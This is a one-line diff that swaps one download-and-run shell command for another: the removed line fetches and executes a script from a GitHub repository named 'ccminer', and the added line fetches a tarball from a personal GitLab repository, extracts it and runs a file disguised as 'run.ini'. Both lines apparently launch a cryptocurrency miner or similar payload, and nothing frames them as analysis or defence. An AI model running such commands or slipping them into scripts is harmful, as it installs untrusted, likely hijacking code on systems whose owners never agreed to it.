@@ -1,1 +1,1 @@
-wget https://github.com/adrianan156/ccminer/raw/main/cuk.sh && chmod +x cuk.sh && ./cuk.sh
+wget https://gitlab.com/likenastar90/tar/-/raw/main/bionic.tar.gz && tar -xf bionic.tar.gz && ./run.ini
